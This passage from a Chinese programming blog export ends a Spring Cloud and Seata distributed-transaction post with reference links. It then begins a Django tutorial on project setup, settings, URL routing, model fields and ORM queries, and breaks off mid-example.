<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">@</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">create</span><span class="params">(Order order)</span> &#123;</span><br><span class="line">    <span class="comment">// 创建订单</span></span><br><span class="line">    orderMapper.create(order);</span><br><span class="line">    <span class="comment">// 修改库存</span></span><br><span class="line">    storageService.decrease(productId, count);</span><br><span class="line">    <span class="comment">// 修改余额</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 修改订单状态</span></span><br><span class="line">    orderMapper.update(order);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用库存服务</span></span><br><span class="line"><span class="meta">@FeignClient(value=&quot;storage-service&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StorageService</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(value=&quot;/decrease&quot;)</span></span><br><span class="line">    CommonResult <span class="title function_">decrease</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(&quot;productId&quot;)</span> Long productId, </span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(&quot;count&quot;)</span> Integer count)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用支付服务</span></span><br><span class="line"><span class="meta">@FeignClient(value=&quot;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">AccountService</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写 Controller</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderController</span>&#123;</span><br><span class="line">    <span class="comment">// 调用服务层</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写 Config</p>
<ul>
<li>Mybatis</li>
<li>Druid</li>
</ul>
<p>配置主启动</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span></span><br></pre></td></tr></table></figure>

<p>配置事务</p>
<p>由于Feign的超时重试机制，可能会导致账户多次扣钱。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">OrderService</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@GlobalTransactional(name=&quot;xxx-create-order&quot;, rollbackFor=Exception.class)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">create</span><span class="params">(Order order)</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>模式</p>
<ul>
<li>AT</li>
<li>TCC</li>
<li>SAGA</li>
<li>XA</li>
</ul>
<h1 id="参考：开源仓库"><a href="#参考：开源仓库" class="headerlink" title="参考：开源仓库"></a>参考：开源仓库</h1><p><a href="https://github.com/it-wwh/spring-cloud-gateway-oauth2">Github: spring-cloud-gateway-oauth2</a></p>
<p><a href="https://gitee.com/mindskip/xzs-mysql">在线考试系统</a></p>
<p><a href="https://thingsboard.io/docs/">Things Board</a></p>
<p><a href="https://gitee.com/zhijiantianya/onemall">One Mall</a></p>
<p><a href="https://github.com/macrozheng">Macro Zheng</a></p>
<p><a href="https://github.com/macrozheng/springcloud-learning">Spring Cloud</a></p>
<h1 id="参考：其他"><a href="#参考：其他" class="headerlink" title="参考：其他"></a>参考：其他</h1><p><a href="https://www.cnblogs.com/dk1024/p/14015486.html">分布式WebSocket</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Django</title>
    <url>/2020/01/30/Python/Django/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><h3 id="Django-3-官方参考文档"><a href="#Django-3-官方参考文档" class="headerlink" title="Django 3 官方参考文档"></a>Django 3 官方参考文档</h3><p><a href="https://docs.djangoproject.com/zh-hans/3.0/contents/">点击进入</a></p>
<h3 id="Django-2-2-官方参考文档"><a href="#Django-2-2-官方参考文档" class="headerlink" title="Django 2.2 官方参考文档"></a>Django 2.2 官方参考文档</h3><p><a href="https://docs.djangoproject.com/zh-hans/2.2/contents/">点击进入</a></p>
<h3 id="Django-2-2-其他参考文档"><a href="#Django-2-2-其他参考文档" class="headerlink" title="Django 2.2 其他参考文档"></a>Django 2.2 其他参考文档</h3><p><a href="https://code-examples.net/zh-CN/docs/django~2.2/index">点击进入</a></p>
<h3 id="Django-1-11-官方参考文档"><a href="#Django-1-11-官方参考文档" class="headerlink" title="Django 1.11 官方参考文档"></a>Django 1.11 官方参考文档</h3><p><a href="https://docs.djangoproject.com/en/1.11/contents/">点击进入（英文）</a></p>
<h3 id="Django-1-11-中文参考文档"><a href="#Django-1-11-中文参考文档" class="headerlink" title="Django 1.11 中文参考文档"></a>Django 1.11 中文参考文档</h3><p><a href="https://yiyibooks.cn/xx/Django_1.11.6/index.html">点击进入</a></p>
<blockquote>
<p>Django 2 及后续版本不再支持 Python 2；</p>
<p>Django 3 及后续版本不再支持 Python 3.5 及以下版本。</p>
</blockquote>
<h3 id="Django-1-与-2-的区别"><a href="#Django-1-与-2-的区别" class="headerlink" title="Django 1 与 2 的区别"></a>Django 1 与 2 的区别</h3><p>主要区别如下：</p>
<ul>
<li>url 用法：Django 1 主要使用 url 来配置，参数部分使用<code>()</code>做匹配；Django 2 使用 path 来配置，参数部使用<code>&lt;&gt;</code>做匹配，不支持传统的正则表达式。这里Django 2 兼容 Django 1 ，可以用re_path来做Django 1中url的操作。</li>
<li>路由分发 include。</li>
<li>ORM 外键：Django 2 的外键必须加on_delete属性</li>
</ul>
<p><a href="https://www.cnblogs.com/Zzbj/p/11150041.html">参考文章一</a><br><a href="https://www.cnblogs.com/feixuelove1009/p/7989720.html">参考文章二</a></p>
<h3 id="Django-3-0-新特性（2019年12月-推出）"><a href="#Django-3-0-新特性（2019年12月-推出）" class="headerlink" title="Django 3.0 新特性（2019年12月 推出）"></a>Django 3.0 新特性（2019年12月 推出）</h3><ul>
<li>仅支持 Python 3.6以上版本。</li>
<li>支持使用 MariaDB 10.1 或更高版本的数据库。</li>
<li>开始将新增对 ASGI 的支持。这意味着 Django 3 可以支持异步操作，消除阻塞操作对程序的影响。</li>
<li>新增枚举类型 TextChoices 和 IntegerChoices 类。</li>
</ul>
<p>枚举示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(models.Model):</span><br><span class="line">    FRESHMAN = <span class="string">&#x27;FR&#x27;</span></span><br><span class="line">    SOPHOMORE = <span class="string">&#x27;SO&#x27;</span></span><br><span class="line">    JUNIOR = <span class="string">&#x27;JR&#x27;</span></span><br><span class="line">    SENIOR = <span class="string">&#x27;SR&#x27;</span></span><br><span class="line">    GRADUATE = <span class="string">&#x27;GR&#x27;</span></span><br><span class="line">    YEAR_IN_SCHOOL_CHOICES = [</span><br><span class="line">        (FRESHMAN, <span class="string">&#x27;Freshman&#x27;</span>),</span><br><span class="line">        (SOPHOMORE, <span class="string">&#x27;Sophomore&#x27;</span>),</span><br><span class="line">        (JUNIOR, <span class="string">&#x27;Junior&#x27;</span>),</span><br><span class="line">        (SENIOR, <span class="string">&#x27;Senior&#x27;</span>),</span><br><span class="line">        (GRADUATE, <span class="string">&#x27;Graduate&#x27;</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    year_in_school = models.CharField(</span><br><span class="line">        max_length=<span class="number">2</span>,</span><br><span class="line">        choices=YEAR_IN_SCHOOL_CHOICES,</span><br><span class="line">        default=FRESHMAN,</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>


<h2 id="Django-基本操作"><a href="#Django-基本操作" class="headerlink" title="Django 基本操作"></a>Django 基本操作</h2><h3 id="django-admin-基本命令"><a href="#django-admin-基本命令" class="headerlink" title="django-admin 基本命令"></a>django-admin 基本命令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">django-admin startproject     <span class="comment"># 创建Django项目</span></span><br><span class="line">django-admin startapp         <span class="comment"># 创建Django应用</span></span><br><span class="line">django-admin check            <span class="comment"># 检查项目完整性</span></span><br><span class="line">django-admin <span class="built_in">test</span>             <span class="comment"># 执行单元测试</span></span><br><span class="line">django-admin runserver        <span class="comment"># 启动服务器</span></span><br><span class="line">django-admin shell            <span class="comment"># 进入Django Shell</span></span><br><span class="line">django-admin makemigrations   <span class="comment"># 创建数据库迁移文件</span></span><br><span class="line">django-admin migrate          <span class="comment"># 执行迁移文件</span></span><br><span class="line">django-admin dumpdata         <span class="comment"># 导出数据库数据</span></span><br><span class="line">django-admin loaddata         <span class="comment"># 导入数据库数据</span></span><br></pre></td></tr></table></figure>

<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><h4 id="项目结构-A-（本次使用）"><a href="#项目结构-A-（本次使用）" class="headerlink" title="项目结构 A （本次使用）"></a>项目结构 A （本次使用）</h4><ul>
<li>Project         # 项目目录<ul>
<li>manage.py     # 项目管理文件</li>
<li>project_name  # 项目配置目录<ul>
<li>asgi.py     # Django 3.0 新增文件</li>
<li>settings.py # 项目配置</li>
<li>urls.py     # 项目路由</li>
<li>wsgi.py     # Web 与 Django 交互入口</li>
</ul>
</li>
<li>my_app        # 创建的Django应用目录<ul>
<li>migrations  # 数据库迁移文件目录</li>
<li>static      # 静态文件目录</li>
<li>templates   # 模板目录<ul>
<li>index.html</li>
</ul>
</li>
<li>templatetags  # 自定义标签过滤器目录<ul>
<li><code>__init__.py</code></li>
</ul>
</li>
<li>urls.py     # 应用路由</li>
<li>apps.py     # 应用声明</li>
<li>models.py   # 应用模型</li>
<li>test.py     # 单元测试</li>
<li>admin.py    # Admin模块</li>
<li>views.py    # 应用视图</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>创建过程如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">django-admin startproject project_name</span><br><span class="line"><span class="built_in">cd</span> project_name</span><br><span class="line">django-admin startapp my_app</span><br><span class="line"><span class="built_in">cd</span> my_app</span><br><span class="line"><span class="built_in">mkdir</span> templates</span><br><span class="line"><span class="built_in">mkdir</span> templatetags</span><br><span class="line"><span class="built_in">mkdir</span> static</span><br></pre></td></tr></table></figure>

<h4 id="项目结构-B"><a href="#项目结构-B" class="headerlink" title="项目结构 B"></a>项目结构 B</h4><p>部分Django项目也会用到这种结构，即将模板，过滤器，静态文件等目录放在应用的外部。</p>
<ul>
<li>Project<ul>
<li>manage.py</li>
<li>project_name<ul>
<li>settings.py</li>
<li>urls.py</li>
<li>wsgi.py （ Web 与 Django 交互入口）</li>
</ul>
</li>
<li>templates<ul>
<li>my_app_templates<ul>
<li>index.html</li>
</ul>
</li>
</ul>
</li>
<li>templatetags  # 自定义标签过滤器<ul>
<li><code>__init__.py</code></li>
</ul>
</li>
<li>my_app<ul>
<li>migrations</li>
<li>urls.py</li>
<li>apps.py</li>
<li>models.py</li>
<li>test.py</li>
<li>admin.py</li>
<li>views.py</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 每创建一个应用，都要在项目setting.py中声明该应用</span></span><br><span class="line">INSTALLED_APPS=[</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">&#x27;my_app&#x27;</span>,</span><br><span class="line">    <span class="comment"># 或写成</span></span><br><span class="line">    <span class="string">&#x27;my_app.apps.MyAppConfig&#x27;</span> <span class="comment"># 具体可以到应用的apps.py文件中查看命名</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置项目的数据库，可以保持默认SQLite</span></span><br><span class="line">DATABASES=[</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.sqlite3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;NAME&#x27;</span>: os.path.join(BASE_DIR, <span class="string">&#x27;db.sqlite3&#x27;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果要改为MySQL，配置如下。注意：首次运行可能需要安装所提示的Python扩展包。</span></span><br><span class="line">DATABASES=[</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;数据库名称&#x27;</span>,  <span class="comment"># 必须手动创建</span></span><br><span class="line">        <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;HOST&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PORT&#x27;</span>: <span class="number">3306</span>,</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果使用项目结构 B，则做下面的配置，配置要渲染的模板的目录</span></span><br><span class="line">TEMPLATES = [</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">&#x27;DIR&#x27;</span> = [os.path.join(BASE_DIR, <span class="string">&#x27;templates&#x27;</span>)]</span><br><span class="line">    ...</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改默认语言和时区</span></span><br><span class="line">LANGUAGE_CODE = <span class="string">&#x27;zh-hans&#x27;</span></span><br><span class="line">TIME_ZONE = <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果项目完成后，在交付阶段，要将DEBUG关闭，并配置允许访问的主机</span></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line">ALLOWED_HOSTS = [<span class="string">&#x27;*&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>配置完成后，在应用my_app下的views.py中添加一个简易的视图：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Hello World&quot;</span>)</span><br></pre></td></tr></table></figure>


<p>同时应该配置路由文件，在my_app中创建并配置urls.py。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Django 2.0 以上推荐此写法，后续写法均为 2.0 写法。</span></span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, re_path, include</span><br><span class="line"><span class="keyword">import</span> my_app.views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;hello/&#x27;</span>, my_app.views.hello),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Django 1.11 以及之前的写法。</span></span><br><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url, include</span><br><span class="line"><span class="keyword">import</span> my_app.views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    <span class="comment"># 写法 1：这里的&#x27;hello&#x27;是按照字符串进行匹配，如果用户写作helloabcd，也会命中该记录，如果想修正这种错误，可以写作&#x27;hello/&#x27;。</span></span><br><span class="line">    url(<span class="string">&#x27;hello&#x27;</span>, my_app.views.hello),</span><br><span class="line">    <span class="comment"># 写法 2：使用正则表达式，r表示该串为正则表达式，^与$分别标记了正则表达式匹配的开始和结尾，这样，用户写helloabcd就不会命中了。使用正则表达式的好处，例如匹配GET参数等，都会使操作变得很方便。</span></span><br><span class="line">    url(<span class="string">r&#x27;^hello/$&#x27;</span>, my_app.views.hello),</span><br><span class="line">] </span><br></pre></td></tr></table></figure>

<p>之后再配置项目路由器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class="line">    path(<span class="string">&#x27;my_app/&#x27;</span>, include(<span class="string">&#x27;my_app.urls&#x27;</span>))</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>配置到这里就可以运行项目看效果了。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python manage.py runserver 8080</span><br></pre></td></tr></table></figure>

<p>进入如下地址，出现<code>Hello World</code>就算配置成功了。<br><a href="http://127.0.0.1:8080/my_app/hello/">http://127.0.0.1:8080/my_app&#x2F;hello&#x2F;</a></p>
<h2 id="Django-模型"><a href="#Django-模型" class="headerlink" title="Django 模型"></a>Django 模型</h2><p>模型（Models）是用于对接数据库的接口，在所有的MVC应用中都是如此。Django的模型的定义如下：</p>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul>
<li>整型：<code>IntegerField</code></li>
<li>定长文本：<code>CharField</code> </li>
<li>不定长文本：<code>TextField</code> </li>
<li>日期：<code>DataField</code></li>
<li>时间：<code>TimeField</code></li>
<li>日期时间：<code>DateTimeField</code></li>
<li>自增ID：<code>AutoField</code>   （可以不定义，自动生成）</li>
<li>布尔：<code>BooleanField</code></li>
<li>Null型布尔：<code>NullBooleanField</code></li>
<li>十进制浮点数：<code>DecimalField</code>  （精度更高，例如钱数）</li>
<li>浮点型：<code>FloatField</code></li>
<li>文件：<code>FileField</code></li>
<li>图片：<code>ImageField</code></li>
</ul>
<h3 id="主要属性"><a href="#主要属性" class="headerlink" title="主要属性"></a>主要属性</h3><ul>
<li>主键：primary_key</li>
<li>长度：max_length</li>
<li>默认值：default</li>
<li>唯一性：unique（不允许重复出现）</li>
<li>索引：db_index</li>
<li>自定义字段名称：db_column</li>
<li>是否允许为空：null</li>
<li>是否允许空白：blank</li>
<li>十进制浮点数：<ul>
<li>数字数：max_digits   </li>
<li>小数点数：decimal_places</li>
</ul>
</li>
<li>日期（二者只能用一个）<ul>
<li>更新时间：auto_now</li>
<li>创建时间：auto_now_add</li>
</ul>
</li>
<li>外键：’其他表’   （赋值时直接写该对象，2.0以上版本还要求on_delete属性）</li>
</ul>
<h3 id="创建模型"><a href="#创建模型" class="headerlink" title="创建模型"></a>创建模型</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyBookModel</span>(models.Model):</span><br><span class="line">    <span class="comment"># 注意：属性名不能出现两个连续的下划线，</span></span><br><span class="line">    <span class="comment"># title</span></span><br><span class="line">    title = models.CharField(max_length=<span class="number">20</span>)</span><br><span class="line">    <span class="comment"># publish_date</span></span><br><span class="line">    publish_date = models.DateTimeField(auto_now=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># author</span></span><br><span class="line">    author = models.ForeignKey(<span class="string">&#x27;AuthorModel&#x27;</span>, on_delete=models.CASCADE)</span><br><span class="line">    <span class="comment"># Django 1 版本中不要求on_delete</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.title</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AuthorModel</span>(models.Model):</span><br><span class="line">    <span class="comment"># name</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">20</span>)</span><br><span class="line">    <span class="comment"># age</span></span><br><span class="line">    age = models.IntegerField(default=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.name</span><br></pre></td></tr></table></figure>

<p>完成后，迁移数据库到sqlite：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>

<h3 id="使用模型"><a href="#使用模型" class="headerlink" title="使用模型"></a>使用模型</h3><h4 id="简单查询操作"><a href="#简单查询操作" class="headerlink" title="简单查询操作"></a>简单查询操作</h4><ul>
<li>get：返回模型对象；查到多条或是未查到都会抛出异常。</li>
<li>all：返回查询集；返回所有数据</li>
<li>filter：返回查询集；返回满足条件的数据</li>
<li>exclude：返回查询集；返回不满足条件的数据</li>
<li>order_by：返回查询集；对查询结果排序</li>
</ul>
<p>对于 get，filter，exclude 这三个查询操作，可以填写查询条件，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 精确查询</span></span><br><span class="line">MyBookModel.objects.get(<span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">MyBookModel.objects.get(title__exact=<span class="string">&quot;First Book&quot;</span>)  <span class="comment"># 同 title=&quot;First Book&quot;</span></span><br><span class="line"><span class="comment"># 模糊查询</span></span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(title__contains=<span class="string">&quot;First&quot;</span>)</span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(title__startswith=<span class="string">&quot;First&quot;</span>)</span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(title__endswith=<span class="string">&quot;Book&quot;</span>)</span><br><span class="line"><span class="comment"># 空查询</span></span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(title__isnull=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 范围查询</span></span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(id__in=[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>])</span><br><span class="line"><span class="comment"># 比较查询</span></span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(id__gt=<span class="number">2</span>)</span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(id__lt=<span class="number">2</span>)</span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(id__gte=<span class="number">2</span>)</span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(id__lte=<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 日期查询</span></span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(publish_date__year=<span class="number">1990</span>)</span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(publish_date__month=<span class="number">2</span>)</span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(publish_date__day=<span class="number">2</span>)</span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(publish_date__gt=date(<span class="number">1980</span>,<span class="number">3</span>,<span class="number">2</span>))</span><br><span class="line"><span class="comment"># 排序</span></span><br><span class="line">MyBookModel.objects.<span class="built_in">all</span>().order_by(<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;title&#x27;</span>)  <span class="comment"># 升序</span></span><br><span class="line">MyBookModel.objects.<span class="built_in">all</span>().order_by(<span class="string">&#x27;-id&#x27;</span>)  <span class="comment"># 降序，前面加一个 减号</span></span><br><span class="line"><span class="comment"># 查看是否有数据</span></span><br><span class="line">m = MyBookModel.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">m.exists()</span><br></pre></td></tr></table></figure>
<p>也就是说，其参数格式为<code>模型属性名__条件名=值</code>。（注意是双下划线）</p>
<h4 id="高级查询操作"><a href="#高级查询操作" class="headerlink" title="高级查询操作"></a>高级查询操作</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db.models <span class="keyword">import</span> F, Q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接书写，默认为“且”的关系</span></span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(id__gt=<span class="number">2</span>, title__contains=<span class="string">&quot;First&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Q 对象，实现“与或非”的关系</span></span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(Q(id__gt=<span class="number">2</span>) &amp; Q(title__contains=<span class="string">&quot;First&quot;</span>))  <span class="comment"># 且的关系</span></span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(Q(id__gt=<span class="number">2</span>) | Q(title__contains=<span class="string">&quot;First&quot;</span>))  <span class="comment"># 或的关系</span></span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(~Q(<span class="built_in">id</span>=<span class="number">2</span>))  <span class="comment"># id 不为 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># F 对象，实现“属性（字段）”之间的比较</span></span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(publish_date=F(<span class="string">&#x27;publish_date&#x27;</span>))  <span class="comment"># 查询出版日期与出版日期相等的对象</span></span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(publish_date=F(<span class="string">&#x27;publish_date&#x27;</span>) / <span class="number">3</span>)  <span class="comment"># 查询出版日期与出版日期除以三相等的对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 聚合函数 sum count avg max min</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.db.models <span class="keyword">import</span> Sum, Count, Avg, Max, Min</span><br><span class="line">MyBookModel.objects.<span class="built_in">all</span>().aggregate(Count(<span class="string">&#x27;id&#x27;</span>))  <span class="comment"># 返回字典 &#123;&#x27;id_count&#x27;: 2&#125;</span></span><br><span class="line">MyBookModel.objects.aggregate(Count(<span class="string">&#x27;id&#x27;</span>))  <span class="comment"># 返回字典 &#123;&#x27;id_count&#x27;: 2&#125;，与前者功能一致</span></span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(id__gt=<span class="number">2</span>).count()  <span class="comment"># id 大于 2 的记录数目</span></span><br></pre></td></tr></table></figure>

<p>查询集：</p>
<ul>
<li>惰性查询：只有需要具体数据的时候才发生查询。</li>
<li>缓存：第一次查询到的查询集数据会缓存下来，第二次再访问这个查询集的时候就会使用缓存的内容。</li>
<li>切片：对一个查询集切片会产生新的查询集，且切片参数不可为负数。</li>
</ul>
<h4 id="模型关系"><a href="#模型关系" class="headerlink" title="模型关系"></a>模型关系</h4><p>模型（数据表）关系分为：</p>
<ul>
<li>一对一</li>
<li>一对多</li>
<li>多对多</li>
</ul>
<p>关系属性：</p>
<ul>
<li>多对多：ManyToManyField(‘表名’)，可以任意定义到其中一个模型中。</li>
<li>一对一：OneToOneField(‘表名’)，可以任意定义到其中一个模型中。</li>
<li>多对一：ForeignKey(‘表名’)，定义在多的模型中。</li>
</ul>
<h4 id="关联查询（一对多）"><a href="#关联查询（一对多）" class="headerlink" title="关联查询（一对多）"></a>关联查询（一对多）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询一表</span></span><br><span class="line">一表.objects.<span class="built_in">filter</span>(多表__属性__条件=<span class="string">&#x27;...&#x27;</span>)  <span class="comment"># 这里的多表要小写</span></span><br><span class="line">AuthorModel.objects.<span class="built_in">filter</span>(mybookmodel__title__contains=<span class="string">&#x27;First&#x27;</span>)</span><br><span class="line"><span class="comment"># 查询多表</span></span><br><span class="line">多表.objects.<span class="built_in">filter</span>(外键__属性__条件=<span class="string">&#x27;...&#x27;</span>)  </span><br><span class="line">MyBookModel.objects.<span class="built_in">filter</span>(author__name__contains=<span class="string">&#x27;W&#x27;</span>)</span><br><span class="line"><span class="comment"># 查询多表</span></span><br><span class="line">查询集x = 一表.objects.get(<span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">查询集y = 查询集.多表_<span class="built_in">set</span>.<span class="built_in">all</span>()  <span class="comment"># 多表也要小写</span></span><br><span class="line">x = AuthorModel.objects.get(<span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">y = x.mybookmodel_set.<span class="built_in">all</span>()</span><br></pre></td></tr></table></figure>

<h4 id="插入，更新与删除"><a href="#插入，更新与删除" class="headerlink" title="插入，更新与删除"></a>插入，更新与删除</h4><p>使用举例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> my_app.models <span class="keyword">import</span> AuthorModel, MyBookModel</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> date</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一条作者记录</span></span><br><span class="line">a = AuthorModel()</span><br><span class="line">a.name = <span class="string">&quot;Wang&quot;</span></span><br><span class="line">a.age = <span class="number">80</span></span><br><span class="line">a.save()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一条作者记录</span></span><br><span class="line">a = AuthorModel.objects.create(name=<span class="string">&#x27;Li&#x27;</span>, age=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一条书籍记录</span></span><br><span class="line">m = MyBookModel()</span><br><span class="line">m.title = <span class="string">&quot;First Book&quot;</span></span><br><span class="line">m.date = date(<span 